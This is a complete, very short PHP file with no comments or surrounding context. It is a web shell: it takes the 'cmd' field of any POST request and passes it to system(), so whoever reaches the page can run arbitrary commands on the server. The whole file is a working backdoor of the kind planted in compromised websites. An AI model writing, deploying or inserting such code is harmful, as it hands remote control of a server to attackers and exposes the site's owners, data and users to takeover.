<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
?>
